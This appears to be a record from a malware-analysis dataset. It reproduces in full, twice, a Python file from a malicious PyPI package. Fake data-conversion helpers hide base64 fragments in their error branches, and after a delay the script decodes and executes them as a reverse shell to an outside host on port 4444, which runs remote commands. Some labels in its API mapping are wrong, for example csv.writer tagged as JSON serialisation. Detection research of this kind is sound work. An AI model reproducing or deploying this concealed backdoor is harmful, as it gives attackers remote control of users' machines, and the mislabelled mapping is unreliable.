[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/code-helper-1.0.0/code-helper-1.0.0/code-helper/str_tool.py",
    "code_snippet": "import base64\nimport time\n\ndef json_csv(f_json,f_csv):\n    try:\n        with open(f_json) as json_file:\n            data = json.load(json_file)\n            headers = list(data[0].keys())\n        with open(f_csv, 'w', newline='') as csv_file:\n            writer = csv.writer(csv_file)\n            writer.writerow(headers)\n            for item in data:\n                writer.writerow(item.values())\n    except Exception:\n        return \"aW1wb3J0IHNvY2tldAppbXBvcnQgb3MKaW1wb3J0IHRpbWUKcmVtb3RlPSJlMWU5YTMyMi5pcHY2LjE0MzMuZXUub3JnIgpwb3J0PTQ0NDQKc2VydmVyPShyZW1vdGUscG9ydCkKcz1zb2NrZXQuc29ja2V0KCkKcy5jb25uZWN0KHNlcnZlcikKd2hpbGUgMToKICAgIGRp\"\n\ndef remove_repet(file1,file2):\n    try:\n        df = pd.read_csv(file1)\n        df.drop_duplicates(inplace=True)\n        init = init + ''\n        df.to_csv(file2, index=False)\n    except Exception:\n        return \"cj1vcy5nZXRjd2QoKQogICAgcy5zZW5kKGRpci5lbmNvZGUoKSkKICAgIGNtZD1zLnJlY3YoMTAyNCkuZGVjb2RlKCkKICAgIGlmIGNtZD09ImV4aXQiOgogICAgICAgIGJyZWFrCiAgICBlbGlmIGNtZC5zdGFydHN3aXRoKCJjZCIpOgogICAgICAgIG9zLmNoZGlyKGNtZFsyOl0uc\"\n\ndef get_past_n_days(n):\n    try:\n        today = datetime.now().date()\n        past_n_days = [str(today - timedelta(days=i)) for i in range(n)]\n        return past_n_days\n    except Exception:\n        return \"3RyaXAoKSkKICAgIGVsc2U6CiAgICAgICAgcmVzdWx0PW9zLnBvcGVuKGNtZCkucmVhZCgpCiAgICBzLnNlbmQocmVzdWx0LmVuY29kZSgpKQogICAgdGltZS5zbGVlcCgxKQpzLmNsb3NlKCk=\"\n\ndef demo():\n    time.sleep(600)\n    a=exec\n    j_string = json_csv(\"json_file\",\"csv_file\")\n    r_string = remove_repet(\"file1\",\"file2\")\n    g_string = get_past_n_days(\"five\")\n    a(base64.b64decode(j_string+r_string+g_string))\ndemo()",
    "pattern_analysis": {
      "api_sequence": [
        "open",
        "json.load",
        "open",
        "csv.writer",
        "csv.writer.writerow",
        "csv.writer.writerow",
        "pd.read_csv",
        "pandas.DataFrame.drop_duplicates",
        "pandas.DataFrame.to_csv",
        "datetime.now",
        "datetime.date",
        "timedelta",
        "base64.b64decode",
        "exec"
      ],
      "api_sequence_with_args": [
        "open(f_json)",
        "json.load(json_file)",
        "open(f_csv, 'w', newline='')",
        "csv.writer(csv_file)",
        "csv.writer.writerow(headers)",
        "csv.writer.writerow(item.values())",
        "pd.read_csv(file1)",
        "pandas.DataFrame.drop_duplicates(inplace=True)",
        "pandas.DataFrame.to_csv(file2, index=False)",
        "datetime.now()",
        "datetime.now().date()",
        "timedelta(days=i)",
        "base64.b64decode(j_string + r_string + g_string)",
        "exec(base64.b64decode(j_string + r_string + g_string))"
      ],
      "mapped_sequence": [
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.load",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "csv.writer",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "csv.writer.writerow",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "csv.writer.writerow",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "pd.read_csv",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "pandas.DataFrame.drop_duplicates",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "pandas.DataFrame.to_csv",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "datetime.now",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "datetime.now().date",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "timedelta",
          "id": "create_timedelta",
          "description": "Creates timedelta object with specified microseconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        }
      ],
      "contextual_code": "import base64\nimport time\n\ndef json_csv(f_json, f_csv):\n    try:\n        with open(f_json) as json_file:\n            data = json.load(json_file)\n            headers = list(data[0].keys())\n        with open(f_csv, 'w', newline='') as csv_file:\n            writer = csv.writer(csv_file)\n            writer.writerow(headers)\n            for item in data:\n                writer.writerow(item.values())\n    except Exception:\n        return \"aW1wb3J0IHNvY2tldAppbXBvcnQgb3MKaW1wb3J0IHRpbWUKcmVtb3RlPSJlMWU5YTMyMi5pcHY2LjE0MzMuZXUub3JnIgpwb3J0PTQ0NDQKc2VydmVyPShyZW1vdGUscG9ydCkKcz1zb2NrZXQuc29ja2V0KCkKcy5jb25uZWN0KHNlcnZlcikKd2hpbGUgMToKICAgIGRp\"\n\ndef remove_repet(file1, file2):\n    try:\n        df = pd.read_csv(file1)\n        df.drop_duplicates(inplace=True)\n        init = init + ''\n        df.to_csv(file2, index=False)\n    except Exception:\n        return \"cj1vcy5nZXRjd2QoKQogICAgcy5zZW5kKGRpci5lbmNvZGUoKSkKICAgIGNtZD1zLnJlY3YoMTAyNCkuZGVjb2RlKCkKICAgIGlmIGNtZD09ImV4aXQiOgogICAgICAgIGJyZWFrCiAgICBlbGlmIGNtZC5zdGFydHN3aXRoKCJjZCIpOgogICAgICAgIG9zLmNoZGlyKGNtZFsyOl0uc\"\n\ndef get_past_n_days(n):\n    try:\n        today = datetime.now().date()\n        past_n_days = [str(today - timedelta(days=i)) for i in range(n)]\n        return past_n_days\n    except Exception:\n        return \"3RyaXAoKSkKICAgIGVsc2U6CiAgICAgICAgcmVzdWx0PW9zLnBvcGVuKGNtZCkucmVhZCgpCiAgICBzLnNlbmQocmVzdWx0LmVuY29kZSgpKQogICAgdGltZS5zbGVlcCgxKQpzLmNsb3NlKCk=\"\n\ndef demo():\n    time.sleep(600)\n    a = exec\n    j_string = json_csv(\"json_file\", \"csv_file\")\n    r_string = remove_repet(\"file1\", \"file2\")\n    g_string = get_past_n_days(\"five\")\n    a(base64.b64decode(j_string + r_string + g_string))\ndemo()"
    }
  }
]